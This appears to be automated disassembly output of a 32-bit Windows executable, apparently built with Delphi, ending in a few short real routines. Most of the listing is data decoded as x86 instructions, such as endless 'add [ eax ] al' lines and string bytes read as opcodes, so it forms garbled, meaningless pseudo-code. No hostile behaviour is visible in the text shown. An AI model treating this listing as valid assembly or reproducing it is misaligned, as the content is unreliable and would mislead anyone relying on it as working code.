add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
outsb
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] bl
outsb
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi - 0x4953ffc0 ] bl
inc eax
outsd
outsb
outsb
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x40 ] ah
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4c00406d ] dh
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
lodsb [ esi ]
mov dh 0x40
add ah dh
xor [ eax ] al
push cs
inc ebp
dec eax
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] dh
dec edi
dec bp
insd
outsd
jb r-xdata
add ah dh
xor [ eax ] al
or al 0x45
dec edi
jne r-xdata
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
lodsb [ esi ]
mov dh 0x40
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 ] ch
jb r-xdata
add [ eax ] al
je r-xdata
lea eax [ eax ]
sbb al 0x6f
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 ] bl
jo r-xdata
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
or al [ ebp + 0x44 ]
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
fdiv [ eax + 0x40 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jo r-xdata
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] ch
outsd
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
or [ ebp + 0x49 ] eax
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x70
popad
insb
mov eax eax
int3
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4c00406d ] dh
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
xor [ eax ] al
or [ ebp + 0x45 ] eax
js r-xdata
inc eax
xor [ eax ] al
adc al [ ebp + 0x45 ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4c00406d ] dh
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
xor [ eax ] al
or eax [ ebp + 0x49 ]
outsb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x6f
imul ebp [ edi + 0x6e ] 0x406ec090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 ] dh
inc eax
add [ eax ] dl
add [ eax ] al
add al ah
outsd
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
add [ eax ] dl
add [ eax ] al
add al ah
outsd
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ eax + 0x40 ]
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0x100040 ] al
add [ eax ] al
loopne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsd
jb r-xdata
xor [ eax ] al
hlt
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jno r-xdata
outsd
jb r-xdata
inc eax
add [ eax - 0xbffbfd0 ] bh
rol [ eax + esi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
or eax [ ebp + 0x52 ]
popad
outsb
inc ebp
jb r-xdata
xor [ eax ] al
mov eax 0xf4004030
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add ah cl
outsd
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] ch
outsd
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
outsd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jno r-xdata
add [ eax ] dl
xor [ eax ] al
or al 0x45
dec ecx
outsb
je r-xdata
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ ecx + esi * 2 + 0x40 ] al
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
or al [ ebp + 0x49 ]
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x1040b232
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jb r-xdata
inc ebp
jb r-xdata
add [ eax - 0xbffbfd0 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ eax + 0x40 ] dh
add [ eax ] dl
add [ eax ] al
add al ah
outsd
imul ebp [ edi + 0x6e ] 0x40702c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
jb r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x72986564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40724090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
add [ eax ] al
add [ eax ] ch
outsd
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
or al [ ebp + 0x4d ]
popad
je r-xdata
inc eax
add [ eax + 0x4071 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004071 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004072 ] bl
add [ eax ] al
add [ ecx + esi * 2 + 0x40 ] al
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
add [ eax ] dl
add [ eax ] al
add [ ecx + esi * 2 + 0x40 ] al
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x72 ] al
inc eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x73 ] cl
inc eax
add [ eax ] dl
add [ eax ] al
add [ ecx + esi * 2 + 0x40 ] al
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
or al [ ebp + 0x55 ]
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jae r-xdata
jb r-xdata
mov eax 0xf4004030
call sub_40b212
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jae r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0xc0040 ] ah
add [ eax ] dl
add [ eax ] al
add [ eax ] bl
outsb
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi - 0x4953ffc0 ] bl
inc eax
add ah dh
xor [ eax ] al
cmovne ecx [ ecx + 0x6e ]
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] bl
lea eax [ eax ]
add [ eax + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 ] dh
or al 0x0
jae r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
add [ eax + eax ] cl
xor [ eax ] al
or [ ebp + 0x4f ] eax
jbe r-xdata
pushfd
xor [ eax ] al
mov eax 0xf4004030
dec eax
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ eax ] al
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
or eax [ ebp + 0x5a ]
jb r-xdata
shl al 0x72
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 2 + 0x100040 ] dl
add [ eax ] al
sub [ edi + 0x40 ] ch
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
push cs
inc ebp
push ebx
je r-xdata
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
outsb
lea eax [ eax ]
mov esp 0x4074
jb r-xdata
jbe r-xdata
add [ esi + esi * 4 + 0x30f40040 ] ch
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
or al 0x45
dec ecx
outsb
jbe r-xdata
add [ eax - 0xbffbfd0 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
add [ eax + eax ] cl
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
add [ eax ] al
jb r-xdata
xor [ eax ] al
or eax 0x6e6f4345
jbe r-xdata
add [ eax - 0xbffbfd0 ] bh
add [ eax ] al
add [ eax ] al
mov eax eax
enter 0x4075 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x100040 ] bh
add [ eax ] al
sub [ edi + 0x40 ] ch
inc ebp
jb r-xdata
inc eax
rcr [ esp + esi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
je r-xdata
inc eax
shl [ esi + esi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
or eax 0x72615645
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
or [ ebp + 0x43 ] eax
outsd
outsb
je r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] ch
outsd
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
insb
nop
adc al 0x75
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x10004074
add [ eax ] al
add [ eax ] ch
outsd
inc eax
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] ch
outsd
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
adc [ ebp + 0x41 ] al
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4075 0x0
or al 0x0
insb
outsd
ja r-xdata
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
xor [ eax ] al
or [ ebp + 0x4f ] al
push ebx
inc ebp
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
test [ esi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0xc0040 ] al
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
push cs
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
xor [ eax ] al
or al [ ebp + 0x50 ]
jb r-xdata
mov eax 0xf4004030
jo r-xdata
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
inc ebx
popad
jae r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add al cl
jne r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] dh
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x88004030
push ebp
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
push cs
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ edi + esi * 2 + 0x40 ] dl
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
ja r-xdata
inc ebp
jb r-xdata
hlt
cmp al 0x77
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 ] bh
jb r-xdata
xor eax [ eax ]
pushad
xor eax [ eax ]
insb
jae r-xdata
add [ eax + 0x78 ] cl
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0xc0040 ] dl
adc [ ebp + 0x41 ] al
jae r-xdata
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl al 0x77
inc eax
add [ ecx ] dl
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
aam 0xe9
aas
push edi
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d010
add [ eax + eax ] al
add [ eax + 0x4c004010 ] ah
add [ eax ] al
add [ eax ] al
dec eax
js r-xdata
imul ebp [ edi + 0x6e ] 0x4077ac90
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4c00406d ] dh
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
cmp al 0x77
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jbe r-xdata
int3
add [ eax - 0x77ffbfd0 ] bh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
loopne r-xdata
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
adc al [ ebp + 0x53 ]
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
sar bh 0xff
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x40789c3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x79
inc eax
add [ eax + 0x4078 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] ah
inc eax
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x334c0040 ] dl
inc eax
add [ ebp + edx * 2 + 0x40 ] dh
add [ eax + 0x60004055 ] al
xor eax [ eax ]
push esp
xor eax [ eax ]
nop
push ebp
inc eax
add [ eax + 0x2c004030 ] bh
into
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
jb r-xdata
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
jg r-xdata
je r-xdata
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
add eax 0xffffffd4
jmp sub_40cfa4
adc eax rw-data
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
add [ eax ] al
call sub_403890
pop edi
pop esi
pop ebx
retn
call sub_40b618
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
mov edx ebx
call sub_402b18
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
sub_40794c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407980
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
pop edi
pop esi
pop ebx
retn
sub_4079a4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b18
mov eax esi
pop esi
pop ebx
retn
sub_4079c4
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
sub_4079f0
push ebx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
